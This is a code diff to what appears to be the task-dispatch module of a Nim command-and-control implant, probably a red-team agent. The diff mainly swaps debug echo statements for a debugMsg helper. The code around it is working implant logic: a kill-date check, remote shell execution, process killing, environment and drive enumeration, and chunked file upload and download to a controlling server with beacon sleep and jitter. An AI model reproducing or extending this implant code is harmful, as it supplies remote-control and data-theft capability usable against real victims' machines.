@@ -28,17 +28,16 @@ import ../commands/shell
 import ../commands/upload
 import ../commands/unsetenv
 
+from debug import debugMsg
+
 
 proc checkDate*(kdate: string) : bool =
    if cmp("yyyy-mm-dd", kdate) == 0:
       result = false
    else:
       let killDate = parse(kdate, "yyyy-MM-dd")
-      echo "killdate: ", killDate
       let curDate = now()
-      echo "curDate: ", curDate
       if killDate <= curDate:
-         echo "Killdate has arrived"
          result = true
       else:
          result = false
@@ -50,7 +49,7 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
    var jobSeq: seq[Job]
    var newConfig = curConfig
    for task in tasks:
-      echo "your task is: ", $(task)
+      debugMsg("your task is: ", $(task))
       var temp = ""
       var jtemp: Job     
       let parsedJsonTask =  if task.parameters.contains("{"): parseJson(task.parameters) else: %*{}
@@ -61,29 +60,25 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
             of "cat":
                let spawnResult = await cat.execute(task.parameters)
                temp = temp & spawnResult
-               when not defined(release):
-                  echo "Spawned cat proc \n"
+               debugMsg("Spawned cat proc \n")
             of "cd":
                let spawnResult = await cd.execute(task.parameters)
                temp = temp & fmt"Successfully changed working directory to {task.parameters}? : {$(spawnResult)}"
-               when not defined(release):
-                  echo "Spawned cd proc \n"
+               debugMsg("Spawned cd proc \n")
             of "cp":
                let spawnResult = await cp.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
-               when not defined(release):
-                  echo "spawned cp proc\n"
+               debugMsg("spawned cp proc\n")
                temp = temp & $(spawnResult)
             of "curl":
                let headers = if parsedJsonTask.hasKey("headers"): parsedJsonTask["headers"].getStr() else: ""
                let body = if parsedJsonTask.hasKey("body"): parsedJsonTask["body"].getStr() else: ""
                let spawnResult = await curl.execute(parsedJsonTask["url"].getStr(), parsedJsonTask["method"].getStr(), headers, body)
                temp = temp & spawnResult
-               when not defined(release):
-                  echo "Spawned curl proc \n"
+               debugMsg("Spawned curl proc \n")
             of "download":
                jtemp.Download = true
                let path = parsedJsonTask["file_path"].getStr()
-               echo "path for download: ", $(path)
+               debugMsg("path for download: ", $(path))
                if len(jtemp.FileId) == 0:
                   if not fileExists(path):
                      temp = temp & "Error file does not exist"
@@ -97,27 +92,22 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                if jtemp.ChunkNum != jtemp.TotalChunks:
                   let spawnResult = await download.execute(jtemp.Path, curConfig.ChunkSize, jtemp.ChunkNum, jtemp.TotalChunks, jtemp.FileSize)
                   temp = temp & spawnResult
-                  when not defined(release):
-                     echo "Spawned download proc \n"
+                  debugMsg("Spawned download proc \n")
                   inc jtemp.ChunkNum
                else:
-                  when not defined(release):
-                     echo "Setting downloadChunk to 0"
+                  debugMsg("Setting downloadChunk to 0")
                   jtemp.ChunkNum = 0
             of "drives":
                let spawnResult = await drives.execute()
                temp = temp & $(spawnResult)
-               when not defined(release):
-                  echo "Drives has been called"
+               debugMsg("Drives has been called")
             of "exit":
-               when not defined(release):
-                  echo "It's been a fun ride but all good things eventually come to an end..."
+               debugMsg("It's been a fun ride but all good things eventually come to an end...")
                quit(QuitSuccess)
             of "getenv":
                let spawnResult = await getenv.execute()
                temp = temp & $(spawnResult)
-               when not defined(release):
-                  echo "Getenv has been called"
+               debugMsg("Getenv has been called")
             of "jobs":
                jtemp.Success = true
                for job in runningJobs:
@@ -125,27 +115,22 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
             of "kill":
                let spawnResult = await kill.execute(parseInt(task.parameters))
                temp = temp & $(spawnResult)
-               when not defined(release):
-                  echo "spawned kill proc\n"
+               debugMsg("spawned kill proc\n")
             of "ls":
-               when not defined(release):
-                  echo "Inside ls and task.paramaters: ", $(task.parameters)
+               debugMsg("Inside ls and task.paramaters: ", $(task.parameters))
                let spawnResult = await ls.execute(parsedJsonTask["path"].getStr(), parseBool(parsedJsonTask["recurse"].getStr()))               
                temp = temp & $(spawnResult)
             of "mkdir":
                let spawnResult = await mkdir.execute(task.parameters)
                temp = temp & $(spawnResult)
-               when not defined(release):
-                  echo "Spawned mkdir proc \n"
+               debugMsg("Spawned mkdir proc \n")
             of "mv":
                let spawnResult = await mv.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
                temp = temp & $(spawnResult)
-               when not defined(release):
-                  echo "spawned cp proc\n"
+               debugMsg("spawned cp proc\n")
             of "ps":
                let spawnResult = await ps.execute()
-               when not defined(release):
-                  echo "spawned ps proc\n"
+               debugMsg("spawned ps proc\n")
                temp = temp & $(spawnResult)
             of "pwd":
                let spawnResult = await pwd.execute()
@@ -156,37 +141,31 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
             of "setenv":
                let params = task.parameters.split(" ")
                let spawnResult = await setenv.execute(params[0], params[1])
-               when not defined(release):
-                  echo "spawned unsetenev proc\n"
+               debugMsg("spawned unsetenev proc\n")
                temp = temp & $(spawnResult)
             of "shell":
                let spawnResult = await shell.execute(task.parameters)
-               when not defined(release):
-                  echo "spawned shell proc\n"
+               debugMsg("spawned shell proc\n")
                temp = temp & spawnResult
             of "sleep":
                # Update and modify newConfig that will be returned with new jitter and interval values if they exist 
                newConfig.Jitter = if parsedJsonTask.hasKey("jitter"): parsedJsonTask["jitter"].getInt() else: curConfig.Jitter
                newConfig.Sleep = if parsedJsonTask.hasKey("interval"): parsedJsonTask["interval"].getInt() else: curConfig.Sleep
-               when not defined(release):
-                  echo "newJitter: ", newConfig.Jitter
-                  echo "newInterval: ", newConfig.Sleep
+               debugMsg("newJitter: ", newConfig.Jitter)
+               debugMsg("newInterval: ", newConfig.Sleep)
             of "unsetenv":
                let spawnResult = await unsetenv.execute(task.parameters)
-               when not defined(release):
-                  echo "spawned unsetenev proc\n"
+               debugMsg("spawned unsetenev proc\n")
                temp = temp & $(spawnResult)
             of "upload":
                jtemp.Upload = true
-               when not defined(release):
-                  echo "inside upload jtemp is: ", $(jtemp)
+               debugMsg("inside upload jtemp is: ", $(jtemp))
                if (jtemp.ChunkNum != jtemp.TotalChunks) or (jtemp.ChunkNum == 0 and jtemp.TotalChunks == 0): 
                   let filePath =  parsedJsonTask["remote_path"].getStr()
                   let fileId = parsedJsonTask["file"].getStr()
                   jtemp.Path = filePath
                   jtemp.FileId = fileId
-                  when not defined(release):
-                     echo "Got file path: ", filePath, " and fileId: ", fileId
+                  debugMsg( "Got file path: ", filePath, " and fileId: ", fileId)
                   let uploadJson = %*
                            {
                               "action": "upload",
@@ -196,20 +175,17 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                               "full_path": filePath,
                               "task_id": jtemp.TaskId 
                            }
-                  
+   
                   # let resp = await http.Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true) 
                   let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
-                  when not defined(release):
-                     echo "resp for upload: ", $(resp)
+                  debugMsg("resp for upload: ", $(resp))
                   # let parsedJsonresp = parseJson(decode(resp)[36 .. ^1])
                   let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                   jtemp.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                   let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
-                  when not defined(release):
-                     echo "uploadchunkData: ", $(uploadChunkData)
+                  debugMsg("uploadchunkData: ", $(uploadChunkData))
                   let spawnResult = await upload.execute(uploadChunkData, filePath)
-                  when not defined(release):
-                     echo "spawned upload proc\n"
+                  debugMsg("spawned upload proc\n")
                   temp = temp & $(spawnResult)
                   inc jtemp.ChunkNum
             else:
@@ -232,11 +208,9 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
       jobSeq.add(jtemp)
 
    # Identation matters or you can spend hours debugging...
-   when not defined(release):
-      echo "inside joblauncher and runningJobs: ", $(runningJobs)
+   debugMsg("inside joblauncher and runningJobs: ", $(runningJobs))
    for job in runningJobs:
-      when not defined(release):
-         echo "Inside running jobs for loop here is a running job: ", $(job)
+      debugMsg("Inside running jobs for loop here is a running job: ", $(job))
       # TODO apply DRY to upload and download compact into two distinct methods!
       var copyJob = job
       try:
@@ -244,8 +218,7 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                if job.Download:
                   let spawnResult = await download.execute(job.Path, curConfig.ChunkSize, job.ChunkNum, job.TotalChunks, job.FileSize)
                   copyJob.Response = spawnResult
-                  when not defined(release):
-                     echo "Spawned download proc \n"
+                  debugMsg("Spawned download proc \n")
                   inc copyJob.ChunkNum
                else:
                   let uploadJson = %*
@@ -261,28 +234,23 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                   # let resp = await http.Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true) 
                   # let resp = when defined(AESPSK): $(uploadJson) else: encode(curConfig.PayloadUUID & $(uploadJson), true) 
                   let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
-                  when not defined(release):
-                     echo "resp for upload: ", $(resp)
+                  debugMsg("resp for upload: ", $(resp))
                   # let parsedJsonresp = parseJson(resp[36 .. ^1])
                   let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                   copyJob.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                   let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
-                  when not defined(release):
-                     echo "uploadchunkData: ", $(uploadChunkData)
+                  debugMsg("uploadchunkData: ", $(uploadChunkData))
                   let spawnResult = await upload.execute(uploadChunkData, job.Path)
                   copyJob.Response = $(spawnResult)
-                  when not defined(release):
-                     echo "spawned upload proc\n"
+                  debugMsg("spawned upload proc\n")
                   inc copyJob.ChunkNum
       except:
          let
             e = getCurrentException()
             msg = getCurrentExceptionMsg()
          let error = "An exception has occurred when attempting to do job: " & repr(e) & " with message " & msg  
-         when not defined(release):
-            echo "error has occurred inside running jobs for loop: ", error
-      when not defined(release):
-         echo "adding copyJob to jobSeq: ", $(copyJob)
+         debugMsg("error has occurred inside running jobs for loop: ", error)
+      debugMsg("adding copyJob to jobSeq: ", $(copyJob))
       jobSeq.add(copyJob)
 
    result = (jobs: jobSeq, newConfig: newConfig)
